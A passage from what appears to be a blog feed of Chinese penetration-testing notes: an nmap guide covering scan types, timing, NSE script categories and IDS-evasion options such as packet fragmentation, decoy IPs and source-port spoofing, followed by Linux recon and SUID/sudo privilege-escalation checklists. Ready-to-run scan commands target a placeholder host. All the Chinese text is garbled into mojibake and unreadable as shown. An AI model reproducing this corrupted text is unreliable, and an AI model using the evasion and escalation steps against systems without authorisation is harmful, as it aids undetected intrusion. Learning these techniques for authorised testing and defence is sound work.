unreachableä¿¡æ¯ï¼Œåˆ™å¯è®¤ä¸ºè¿™ä¸ªç«¯å£è¢«å±è”½äº†ã€‚SYNæ¨¡å¼çš„æ‰«æé€Ÿåº¦éå¸¸å¥½ã€‚è€Œä¸”ç”±äºè¿™ç§æ¨¡å¼ä¸ä¼šè¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œæ‰€ä»¥<strong>æ˜¯ä¸€ç§ååˆ†éšè”½çš„æ‰«ææ–¹å¼ã€‚å¦‚æœå¯åŠ¨Nmapçš„ç”¨æˆ·æœ‰é«˜çº§åˆ«æƒé™ï¼Œé‚£ä¹ˆåœ¨é»˜è®¤æƒ…å†µä¸‹Nmapç¨‹åºå°†ä»¥è¿™ç§æ¨¡å¼è¿›è¡Œæ‰«æã€‚</strong></p></li><li><p>TCP NULLï¼ˆ-sNï¼‰ã€FINï¼ˆ-sFï¼‰åŠXMASï¼ˆ-sXï¼‰æ‰«æï¼šNULL æ‰«æä¸è®¾ç½®ä»»ä½•æ§åˆ¶ä½ï¼›FINæ‰«æä»…è®¾ç½®FINæ ‡å¿—ä½ï¼šXMASæ‰«æè®¾ç½®FINã€PSHå’ŒURGçš„æ ‡è¯†ä½ã€‚å¦‚æœç›®æ ‡ä¸»æœºè¿”å› äº†å«æœ‰RSTæ ‡è¯†ä½çš„å“åº”æ•°æ®ï¼Œåˆ™è¯´æ˜è¯¥ç«¯å£å¤„äºå…³é—­çŠ¶æ€ï¼›å¦‚æœç›®æ ‡ä¸»æœºæ²¡æœ‰ä»»ä½•å›åº”ï¼Œ åˆ™è¯¥ç«¯å£å¤„äºæ‰“å¼€ï½œè¿‡æ»¤çŠ¶æ€ã€‚</p></li><li><p>TCP Maimonæ‰«æï¼ˆ-sMï¼‰ï¼šUriel Maimon é¦–å…ˆå‘ç°äº†TCP Maimomæ‰«ææ–¹å¼ã€‚è¿™ç§æ¨¡å¼çš„æ¢æµ‹æ•°æ®åŒ…å«æœ‰FIN/ACKæ ‡è¯†ã€‚å¯¹äºBSDè¡ç”Ÿå‡ºæ¥çš„å„ç§æ“ä½œç³»ç»Ÿæ¥è¯´ï¼Œå¦‚æœè¢«æµ‹ç«¯å£å¤„äº å¼€æ”¾çŠ¶æ€ï¼Œä¸»æœºå°†ä¼šä¸¢å¼ƒè¿™ç§æ¢æµ‹æ•°æ®åŒ…ï¼›å¦‚æœè¢«æµ‹ç«¯å£å¤„äºå…³é—­çŠ¶æ€ï¼Œé‚£ä¹ˆä¸»æœºå°†ä¼šå›å¤ RSTã€‚</p></li><li><p>TCPACKæ‰«æï¼ˆ-sAï¼‰ï¼šè¿™ç§æ‰«ææ¨¡å¼å¯ä»¥<strong>æ£€æµ‹ç›®æ ‡ç³»ç»Ÿæ˜¯å¦é‡‡ç”¨äº†æ•°æ®åŒ…çŠ¶æ€ç›‘æµ‹æŠ€æœ¯ï¼ˆstatefulï¼‰é˜²ç«å¢™</strong>ï¼Œå¹¶èƒ½ç¡®å®šå“ªäº›ç«¯å£è¢«é˜²ç«å¢™å±è”½ã€‚è¿™ç§ç±»å‹çš„æ•°æ®åŒ…åªæœ‰ä¸€ä¸ªACKæ ‡è¯†ä½ã€‚å¦‚æœç›®æ ‡ä¸»æœºçš„å›å¤ä¸­å«æœ‰RSTæ ‡è¯†ï¼Œåˆ™è¯´æ˜ç›®æ ‡ä¸»æœºæ²¡æœ‰è¢«è¿‡æ»¤ã€‚</p></li><li><p>TCPçª—å£æ‰«æï¼ˆ-sWï¼‰ï¼šè¿™ç§æ‰«ææ–¹å¼æ£€æµ‹ç›®æ ‡è¿”å›çš„RSTæ•°æ®åŒ…çš„TCPçª—å£å­—æ®µã€‚å¦‚æœç›®æ ‡ç«¯å£å¤„äºå¼€æ”¾çŠ¶æ€ï¼Œè¿™ä¸ªå­—æ®µçš„å€¼å°†æ˜¯æ­£å€¼ï¼›å¦åˆ™å®ƒçš„å€¼åº”å½“æ˜¯0ã€‚</p></li><li><p>TCP Idleæ‰«æï¼ˆ-sIï¼‰ï¼šé‡‡ç”¨è¿™ç§æŠ€æœ¯åï¼Œæ‚¨å°†é€šè¿‡æŒ‡å®šçš„åƒµå°¸ä¸»æœºå‘é€æ‰«ææ•°æ®åŒ…ã€‚æœ¬æœºå¹¶ä¸ä¸ç›®æ ‡ä¸»æœºç›´æ¥é€šä¿¡ã€‚å¦‚æœå¯¹æ–¹ç½‘ç»œé‡Œæœ‰IDSï¼ŒIDSå°†è®¤ä¸ºå‘èµ·æ‰«æçš„ä¸»æœºæ˜¯åƒµå°¸ä¸»æœºã€‚</p></li></ol><h2 id="UDPæ‰«æ"><a href="#UDPæ‰«æ" class="headerlink" title="UDPæ‰«æ"></a>UDPæ‰«æ</h2><p>UDPæ‰«æåªæœ‰ä¸€ä¸ª<code>-sU</code>é€‰é¡¹ï¼Œç”±äºLinuxå†…æ ¸åªèƒ½è¿›è¡Œ1ç§’1æ¬¡çš„UDPæŠ¥æ–‡å‘é€ï¼Œæ‰€ä»¥å¿…é¡»æœ‰é’ˆå¯¹æ€§çš„ä¼˜åŒ–æ‰«æ</p><ol><li>å¯¹å¸¸è§ç«¯å£è¿›è¡Œæ‰«æ</li><li>å¹¶è¡Œæ‰«æ</li><li>åœ¨é˜²ç«å¢™åæ–¹æ‰«æ</li><li>ä½¿ç”¨â€“host-timeoutè·³è¿‡è¶…æ—¶ä¸»æœº</li></ol><h2 id="ç«¯å£ç›®æ ‡é€‰é¡¹"><a href="#ç«¯å£ç›®æ ‡é€‰é¡¹" class="headerlink" title="ç«¯å£ç›®æ ‡é€‰é¡¹"></a>ç«¯å£ç›®æ ‡é€‰é¡¹</h2><ul><li><code>-p</code> æŒ‡å®šç«¯å£</li><li><code>-F</code> å¿«é€Ÿæ‰«æï¼Œä»…æ‰«æå¸¸ç”¨çš„100ä¸ªç«¯å£</li><li><code>-r</code> é¡ºåºæ‰«æï¼Œä¸éšæœº</li><li><code>--top-ports</code> æ‰«ææ’åå‰Nçš„ç«¯å£</li><li><code>--port-ratio</code> æ‰«æå‰ç™¾åˆ†æ¯”çš„ç«¯å£</li></ul><h2 id="ç‰ˆæœ¬æ¢æµ‹"><a href="#ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="ç‰ˆæœ¬æ¢æµ‹"></a>ç‰ˆæœ¬æ¢æµ‹</h2><ul><li>sV æ‰“å¼€ç‰ˆæœ¬æ¢æµ‹</li><li><code>--version-intensity &lt;intensity&gt;</code> è®¾ç½®ç‰ˆæœ¬æ‰«æå¼ºåº¦, è®¾ç½®å¼ºåº¦çš„å€¼åœ¨ 0~9ä¹‹é—´ï¼Œé»˜è®¤æ˜¯7</li></ul><h2 id="è¾“å‡ºé€‰é¡¹"><a href="#è¾“å‡ºé€‰é¡¹" class="headerlink" title="è¾“å‡ºé€‰é¡¹"></a>è¾“å‡ºé€‰é¡¹</h2><ol><li>-oN Normalï¼Œä¸æ˜¾ç¤ºruntimeå’Œè­¦å‘Šä¿¡æ¯</li><li>-oX xml</li><li>-oG gnmapï¼Œæ–¹ä¾¿Grep</li><li>-oA ä»¥ä¸Šä¸‰ç§ä¸€èµ·è¾“å‡º</li></ol><h2 id="æ—¶é—´æ’ç¨‹æ§åˆ¶"><a href="#æ—¶é—´æ’ç¨‹æ§åˆ¶" class="headerlink" title="æ—¶é—´æ’ç¨‹æ§åˆ¶"></a>æ—¶é—´æ’ç¨‹æ§åˆ¶</h2><p>-T æœ‰6ä¸ªç­‰çº§</p><p>paranoidï¼ˆ0ï¼‰ï¼šæ¯5åˆ†é’Ÿå‘é€ä¸€æ¬¡æ•°æ®åŒ…ï¼Œä¸”ä¸ä¼šä»¥å¹¶è¡Œæ–¹å¼åŒæ—¶å‘é€å¤šç»„æ•°æ®ã€‚è¿™ç§æ¨¡å¼çš„æ‰«æä¸ä¼šè¢«IDSæ£€æµ‹åˆ°ã€‚</p><p>sneakyï¼ˆ1ï¼‰ï¼šæ¯éš”15ç§’å‘é€ä¸€ä¸ªæ•°æ®åŒ…ï¼Œä¸”ä¸ä¼šä»¥å¹¶è¡Œæ–¹å¼åŒæ—¶å‘é€å¤šç»„æ•°æ®ã€‚</p><p>politeï¼ˆ2ï¼‰ï¼šæ¯0.4ç§’å‘é€ä¸€ä¸ªæ•°æ®åŒ…ï¼Œä¸”ä¸ä¼šä»¥å¹¶è¡Œæ–¹å¼åŒæ—¶å‘é€å¤šç»„æ•°æ®ã€‚</p><p>normalï¼ˆ3ï¼‰ï¼šæ­¤æ¨¡å¼åŒæ—¶å‘å¤šä¸ªç›®æ ‡å‘é€å¤šä¸ªæ•°æ®åŒ…ï¼Œä¸º    Nmapé»˜è®¤çš„æ¨¡å¼ï¼Œè¯¥æ¨¡å¼èƒ½è‡ªåŠ¨åœ¨æ‰«ææ—¶é—´å’Œç½‘ç»œè´Ÿè½½ä¹‹é—´è¿›è¡Œå¹³è¡¡ã€‚</p><p>aggressiveï¼ˆ4ï¼‰ï¼šåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒNmap    å¯¹æ¯ä¸ªæ—¢å®šçš„ä¸»æœºåªæ‰«æ5åˆ†é’Ÿï¼Œç„¶åæ‰«æä¸‹ä¸€å°ä¸»æœºã€‚å®ƒç­‰å¾…å“åº”çš„æ—¶é—´ä¸è¶…è¿‡1.25ç§’ã€‚</p><p>insaneï¼ˆ5ï¼‰ï¼šåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒNmapå¯¹æ¯ä¸ªæ—¢å®šçš„ä¸»æœºä»…æ‰«æ74ç§’ï¼Œç„¶åæ‰«æä¸‹ä¸€å°ä¸»æœºã€‚å®ƒç­‰å¾…å“åº”çš„æ—¶é—´ä¸è¶…è¿‡0.3ç§’ã€‚</p><h2 id="è„šæœ¬å¼•æ“"><a href="#è„šæœ¬å¼•æ“" class="headerlink" title="è„šæœ¬å¼•æ“"></a>è„šæœ¬å¼•æ“</h2><p>NSE(Nmap Script Engine)å¯ä»¥æ‰©å±•nmapçš„ä½¿ç”¨èŒƒå›´ï¼Œå¹¶ä¸”ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰è‡ªå·±çš„è„šæœ¬å®ç°é’ˆå¯¹æ€§çš„æ‰«æ</p><p>-sC æˆ–â€“script=defaultï¼šå¯åŠ¨é»˜è®¤ç±»NSEè„šæœ¬ã€‚</p><p>åœ¨Kali Linuxç³»ç»Ÿä¸­ï¼ŒNmapè„šæœ¬ä½äºç›®å½•/usr/share/nmap/scriptsã€‚</p><p><code>--script &lt;filename&gt;|&lt;category&gt;|&lt;directories&gt;</code>ï¼šæ ¹æ®æŒ‡å®šçš„æ–‡ä»¶åã€ç±»åˆ«åã€ç›®å½•åï¼Œæ‰§è¡Œç›¸åº”çš„è„šæœ¬ã€‚</p><p><code>--script-args &lt;args&gt;</code> ï¼šè¿™ä¸ªé€‰é¡¹ç”¨äºç»™è„šæœ¬æŒ‡å®šå‚æ•°ã€‚ä¾‹å¦‚ï¼Œåœ¨ä½¿ç”¨è®¤è¯ç±»è„šæœ¬æ—¶ï¼Œå¯é€šè¿‡è¿™ä¸ªé€‰é¡¹æŒ‡å®šç”¨æˆ·åå’Œå¯†ç </p><table><thead><tr><th align="center">ç±»å‹</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">auth</td><td align="center">æ­¤ç±»è„šæœ¬ä½¿ç”¨æš´åŠ›ç ´è§£ç­‰æŠ€æœ¯æ‰¾å‡ºç›®æ ‡ç³»ç»Ÿä¸Šçš„è®¤è¯ä¿¡æ¯ã€‚</td></tr><tr><td align="center">default</td><td align="center">å¯ç”¨â€“sC æˆ–è€…-A é€‰é¡¹æ—¶è¿è¡Œæ­¤ç±»è„šæœ¬ã€‚è¿™ç±»è„šæœ¬åŒæ—¶å…·æœ‰: æ‰§è¡Œé€Ÿåº¦å¿«ï¼›è¾“å‡ºçš„ä¿¡æ¯æœ‰æŒ‡å¯¼ä¸‹ä¸€æ­¥æ“ä½œçš„ä»·å€¼ï¼›è¾“å‡ºä¿¡æ¯å†…å®¹ä¸°å¯Œã€å½¢å¼ç®€æ´ï¼›å¿…é¡»å¯é ï¼›ä¸ä¼šä¾µå…¥ç›®æ ‡ç³»ç»Ÿï¼›èƒ½æ³„éœ²ä¿¡æ¯ç»™ç¬¬ä¸‰æ–¹ã€‚</td></tr><tr><td align="center">discovery</td><td align="center">è¯¥ç±»è„šæœ¬ç”¨äºæ¢ç´¢ç½‘ç»œã€‚</td></tr><tr><td align="center">dos</td><td align="center">è¯¥ç±»è„šæœ¬å¯èƒ½ä½¿ç›®æ ‡ç³»ç»Ÿæ‹’ç»æœåŠ¡ï¼Œè¯·è°¨æ…ä½¿ç”¨ã€‚</td></tr><tr><td align="center">exploit</td><td align="center">è¯¥ç±»è„šæœ¬åˆ©ç”¨ç›®æ ‡ç³»ç»Ÿçš„å®‰å…¨æ¼æ´ã€‚åœ¨è¿è¡Œè¿™ç±»è„šæœ¬ä¹‹å‰ï¼Œæ¸—é€æµ‹è¯•äººå‘˜éœ€è¦è·å– è¢«æµ‹å•ä½çš„è¡ŒåŠ¨è®¸å¯ã€‚</td></tr><tr><td align="center">external</td><td align="center">è¯¥ç±»è„šæœ¬å¯èƒ½æ³„éœ²ä¿¡æ¯ç»™ç¬¬ä¸‰æ–¹ã€‚</td></tr><tr><td align="center">fuzzer</td><td align="center">è¯¥ç±»è„šæœ¬ç”¨äºå¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚</td></tr><tr><td align="center">instrusive</td><td align="center">è¯¥ç±»è„šæœ¬å¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒï¼Œæˆ–è€—å°½ç›®æ ‡ç³»ç»Ÿçš„æ‰€æœ‰èµ„æºã€‚</td></tr><tr><td align="center">malware</td><td align="center">è¯¥ç±»è„šæœ¬æ£€æŸ»ç›®æ ‡ç³»ç»Ÿä¸Šæ˜¯å¦å­˜åœ¨æ¶æ„è½¯ä»¶æˆ–åé—¨ã€‚</td></tr><tr><td align="center">safe</td><td align="center">è¯¥ç±»è„šæœ¬ä¸ä¼šå¯¼è‡´ç›®æ ‡æœåŠ¡å´©æºƒã€æ‹’ç»æœåŠ¡ä¸”ä¸åˆ©ç”¨æ¼æ´ã€‚</td></tr><tr><td align="center">version</td><td align="center">é…åˆç‰ˆæœ¬æ£€æµ‹é€‰é¡¹ï¼ˆ-sVï¼‰ï¼Œè¿™ç±»è„šæœ¬å¯¹ç›®æ ‡ç³»ç»Ÿçš„æœåŠ¡ç¨‹åºè¿›è¡Œæ·±å…¥çš„ç‰ˆæœ¬æ£€ æµ‹ã€‚</td></tr><tr><td align="center">vuln</td><td align="center">è¯¥ç±»è„šæœ¬å¯æ£€æµ‹æ£€æŸ»ç›®æ ‡ç³»ç»Ÿä¸Šçš„å®‰å…¨æ¼æ´ã€‚</td></tr></tbody></table><ul><li>â€“script-help æ‰“å°å¸®åŠ©</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap --script-help <span class="hljs-string">&quot;(vuln) and *smb*&quot;</span></span></code></pre></div></div><h2 id="è§„é¿æ£€æµ‹é€‰é¡¹"><a href="#è§„é¿æ£€æµ‹é€‰é¡¹" class="headerlink" title="è§„é¿æ£€æµ‹é€‰é¡¹"></a>è§„é¿æ£€æµ‹é€‰é¡¹</h2><p>çœŸå®ç¯å¢ƒä¸­æ¢æµ‹ç›®æ ‡å¾€å¾€éƒ½åœ¨IDSä¹‹åï¼Œæ‰€ä»¥æœ‰å¿…è¦é’ˆå¯¹ç½‘ç»œç¯å¢ƒé€‰æ‹©è§„é¿æ£€æµ‹çš„é€‰é¡¹</p><p>-fï¼ˆä½¿ç”¨å°æ•°æ®åŒ…ï¼‰ï¼šè¿™ä¸ªé€‰é¡¹å¯é¿å…å¯¹æ–¹è¯†åˆ«å‡ºæˆ‘ä»¬æ¢æµ‹çš„æ•°æ®åŒ…ã€‚æŒ‡å®šè¿™ä¸ªé€‰é¡¹ä¹‹åï¼Œ Nmapå°†ä½¿ç”¨8å­—èŠ‚ç”šè‡³æ›´å°æ•°æ®ä½“çš„æ•°æ®åŒ…ã€‚</p><p>â€“mtuï¼šè¿™ä¸ªé€‰é¡¹ç”¨æ¥è°ƒæ•´æ•°æ®åŒ…çš„åŒ…å¤§å°ã€‚MTUï¼ˆMaximum    Transmission Unitï¼Œæœ€å¤§ä¼ è¾“å•å…ƒï¼‰å¿…é¡»æ˜¯8çš„æ•´æ•°å€ï¼Œå¦åˆ™Nmapå°†æŠ¥é”™ã€‚</p><p>-Dï¼ˆè¯±é¥µï¼‰ï¼šè¿™ä¸ªé€‰é¡¹åº”æŒ‡å®šå‡    IPï¼Œå³è¯±é¥µçš„IPã€‚å¯ç”¨è¿™ä¸ªé€‰é¡¹ä¹‹åï¼ŒNmap    åœ¨å‘é€ä¾¦æµ‹ æ•°æ®åŒ…çš„æ—¶å€™ä¼šæºæ‚ä¸€äº›æºåœ°å€æ˜¯å‡IPï¼ˆè¯±é¥µï¼‰çš„æ•°æ®åŒ…ã€‚è¿™ç§åŠŸèƒ½æ„åœ¨ä»¥è—æœ¨äºæ—çš„æ–¹æ³• æ©ç›–æœ¬æœºçš„çœŸå®    IPã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹æ–¹çš„logè¿˜ä¼šè®°å½•ä¸‹æœ¬æœºçš„çœŸå®IPã€‚æ‚¨å¯ä½¿ç”¨RNDç”Ÿæˆéšæœº çš„å‡IPåœ°å€ï¼Œæˆ–è€…ç”¨RNDï¼šnumberçš„å‚æ•°ç”ŸæˆNä¸ªå‡IPåœ°å€ã€‚æ‚¨æ‰€æŒ‡å®šçš„è¯±é¥µä¸»æœº åº”å½“åœ¨çº¿ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å‡»æºƒç›®æ ‡ä¸»æœºã€‚å¦å¤–ï¼Œä½¿ç”¨äº†è¿‡å¤šçš„è¯±é¥µå¯èƒ½é€ æˆç½‘ç»œæ‹¥å µã€‚å°¤å…¶æ˜¯åœ¨æ‰«æå®¢æˆ·çš„ç½‘ç»œçš„æ—¶å€™ï¼Œæ‚¨åº”å½“æåŠ›é¿å…ä¸Šè¿°æƒ…å†µã€‚</p><p><code>--source-port &lt;portnumber&gt;</code>æˆ–-gï¼ˆæ¨¡æ‹Ÿæºç«¯å£ï¼‰ï¼šå¦‚æœé˜²ç«å¢™åªå…è®¸æŸäº›æºç«¯å£çš„å…¥ç«™æµé‡ï¼Œè¿™ä¸ªé€‰é¡¹å°±éå¸¸æœ‰ç”¨ã€‚</p><p>â€“data-lengthï¼šè¿™ä¸ªé€‰é¡¹ç”¨äºæ”¹å˜Nmap    å‘é€æ•°æ®åŒ…çš„é»˜è®¤æ•°æ®é•¿åº¦ï¼Œä»¥é¿å…è¢«è¯†åˆ«å‡ºæ¥æ˜¯Nmapçš„æ‰«ææ•°æ®ã€‚</p><p>â€“max-parallelismï¼šè¿™ä¸ªé€‰é¡¹å¯é™åˆ¶Nmapå¹¶å‘æ‰«æçš„æœ€å¤§è¿æ¥æ•°ã€‚</p><p><code>--scan-delay &lt;time&gt;</code>ï¼šè¿™ä¸ªé€‰é¡¹ç”¨äºæ§åˆ¶å‘é€æ¢æµ‹æ•°æ®çš„æ—¶é—´é—´éš”ï¼Œä»¥é¿å…è¾¾åˆ°IDS/IPSç«¯ å£æ‰«æè§„åˆ™çš„é˜ˆå€¼ã€‚</p><h2 id="å¸¸ç”¨å‘½ä»¤æ„é€ "><a href="#å¸¸ç”¨å‘½ä»¤æ„é€ " class="headerlink" title="å¸¸ç”¨å‘½ä»¤æ„é€ "></a>å¸¸ç”¨å‘½ä»¤æ„é€ </h2><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><h4 id="å¸¸è§ç«¯å£æ‰«æ"><a href="#å¸¸è§ç«¯å£æ‰«æ" class="headerlink" title="å¸¸è§ç«¯å£æ‰«æ"></a>å¸¸è§ç«¯å£æ‰«æ</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 -T4 <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div><h4 id="HTTPç«¯å£æ‰«æ"><a href="#HTTPç«¯å£æ‰«æ" class="headerlink" title="HTTPç«¯å£æ‰«æ"></a>HTTPç«¯å£æ‰«æ</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -p80,443,8000-8100,8443 -T4 <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div><h4 id="æ•°æ®åº“ä¸­top1000ç«¯å£æ‰«æ"><a href="#æ•°æ®åº“ä¸­top1000ç«¯å£æ‰«æ" class="headerlink" title="æ•°æ®åº“ä¸­top1000ç«¯å£æ‰«æ"></a>æ•°æ®åº“ä¸­top1000ç«¯å£æ‰«æ</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -sV -sC -O -T4 -n -Pn -oA fastscan <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div><p>ä½¿ç”¨ç‰ˆæœ¬æ‰«æ(-sV),ä½¿ç”¨defaultè„šæœ¬(-sC),å¼€å¯ç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹(-O),æ‰«æå¼ºåº¦4çº§(-T4),ä¸é€’å½’DNS(-n),ä¸æ£€æµ‹ä¸»æœºæ˜¯å¦pingé€š(-Pn),å…¨æ–‡ä»¶ç±»å‹è¾“å‡º(-oA)</p><h4 id="å°†æ£€æµ‹åˆ°æ‰“å¼€çš„ç«¯å£æ”¾åœ¨ç¯å¢ƒå˜é‡ä¸­"><a href="#å°†æ£€æµ‹åˆ°æ‰“å¼€çš„ç«¯å£æ”¾åœ¨ç¯å¢ƒå˜é‡ä¸­" class="headerlink" title="å°†æ£€æµ‹åˆ°æ‰“å¼€çš„ç«¯å£æ”¾åœ¨ç¯å¢ƒå˜é‡ä¸­"></a>å°†æ£€æµ‹åˆ°æ‰“å¼€çš„ç«¯å£æ”¾åœ¨ç¯å¢ƒå˜é‡ä¸­</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 <span class="hljs-comment">#&#123;RHOST&#125; | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1 | tr &#x27;\n&#x27; &#x27;,&#x27; | sed s/,$//)</span></span></code></pre></div></div><h3 id="è„šæœ¬ä½¿ç”¨"><a href="#è„šæœ¬ä½¿ç”¨" class="headerlink" title="è„šæœ¬ä½¿ç”¨"></a>è„šæœ¬ä½¿ç”¨</h3><h4 id="æŸ¥æ‰¾è„šæœ¬å¹¶æ‰“å°ä½¿ç”¨è¯´æ˜"><a href="#æŸ¥æ‰¾è„šæœ¬å¹¶æ‰“å°ä½¿ç”¨è¯´æ˜" class="headerlink" title="æŸ¥æ‰¾è„šæœ¬å¹¶æ‰“å°ä½¿ç”¨è¯´æ˜"></a>æŸ¥æ‰¾è„šæœ¬å¹¶æ‰“å°ä½¿ç”¨è¯´æ˜</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-comment"># æœç´¢default version safe ç±»å‹çš„æ¨¡å—</span></span><span class="line">locate -r <span class="hljs-string">&#x27;\.nse$&#x27;</span> | xargs grep categories | grep <span class="hljs-string">&#x27;default\|version\|safe&#x27;</span> | grep <span class="hljs-comment">#&#123;module&#125;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># æ‰“å°è¯´æ˜</span></span><span class="line">nmap --script-help <span class="hljs-string">&quot;(default or version) and *#&#123;module&#125;*&quot;</span></span></code></pre></div></div><h4 id="ä½¿ç”¨æ¼æ´æ‰«æ"><a href="#ä½¿ç”¨æ¼æ´æ‰«æ" class="headerlink" title="ä½¿ç”¨æ¼æ´æ‰«æ"></a>ä½¿ç”¨æ¼æ´æ‰«æ</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -sV -O -p --script vuln <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ä¾¦å¯Ÿæ¸…å•</title>
      <link href="/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h2 id="åœ¨ç¡®å®šç³»ç»Ÿåçš„åˆæ­¥ä¾¦å¯Ÿæ¸…å•"><a href="#åœ¨ç¡®å®šç³»ç»Ÿåçš„åˆæ­¥ä¾¦å¯Ÿæ¸…å•" class="headerlink" title="åœ¨ç¡®å®šç³»ç»Ÿåçš„åˆæ­¥ä¾¦å¯Ÿæ¸…å•"></a>åœ¨ç¡®å®šç³»ç»Ÿåçš„åˆæ­¥ä¾¦å¯Ÿæ¸…å•</h2><p>æ£€æŸ¥å¼€æ”¾ç«¯å£ï¼Œç³»ç»Ÿç‰ˆæœ¬ï¼ŒæœåŠ¡ç‰ˆæœ¬ï¼Œæ¼æ´ä¿¡æ¯</p><p><a href="/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/" title="nmap ä½¿ç”¨">nmap ä½¿ç”¨</a></p><ul><li><input disabled="" type="checkbox"> ç«¯å£çš„åˆæ­¥æ‰«æ</li><li><input disabled="" type="checkbox"> ç«¯å£çš„å…¨é¢æ‰«æ</li><li><input disabled="" type="checkbox"> å¸¦æ¼æ‰«è„šæœ¬çš„ç«¯å£å®šå‘æ‰«æ</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> checklist </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ä¾¦å¯Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux å¯æ‰§è¡Œæ–‡ä»¶çš„æ¼æ´åˆ©ç”¨</title>
      <link href="/2021/07/23/linux-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/23/linux-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>å½“å¯æ‰§è¡Œæ–‡ä»¶è¢«é…ç½®ä¸ºSUIDæˆ–è€…æ”¾åœ¨SUDOä¸­çš„æ—¶å€™ï¼Œè¿™å°±æ„å‘³ç€æ–‡ä»¶å¯ä»¥ä»¥é«˜æƒé™è¿è¡Œï¼Œé‚£ä¹ˆåªè¦æ‰¾å‡ºæ¼æ´å°±å¯ä»¥ææƒã€‚</p><p><a href="/2021/07/21/SUID-SGID/" title="Linux SUID &amp; SGID">Linux SUID &amp; SGID</a></p><ul><li><input disabled="" type="checkbox"> è„šæœ¬ç”¨çš„æ˜¯csh?</li><li><input disabled="" type="checkbox"> å¼•ç”¨çš„æ–‡ä»¶æ²¡æœ‰ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Ÿ</li><li><input disabled="" type="checkbox"> è„šæœ¬çš„é€‚ç”¨èŒƒå›´æ˜¯å¦è¿‡å¤§ï¼Ÿ</li><li><input disabled="" type="checkbox"> ä½¿ç”¨äº†ä¸´æ—¶æ–‡ä»¶ï¼Ÿ</li><li><input disabled="" type="checkbox"> å‚æ•°æ˜¯å¦è¿‡æ»¤ï¼Œèƒ½å¦ç”¨åˆ†å·åšæ›´å¤šçš„äº‹</li><li><input disabled="" type="checkbox"> æ˜¯å¦è®¾ç½®äº†IFS</li><li><input disabled="" type="checkbox"> è„šæœ¬æœ¬èº«çš„é£é™©</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> checklist </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ææƒæ¸…å•</title>
      <link href="/2021/07/23/linux-%E6%8F%90%E6%9D%83%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/23/linux-%E6%8F%90%E6%9D%83%E6%B8%85%E5%8D%95/</url>
      
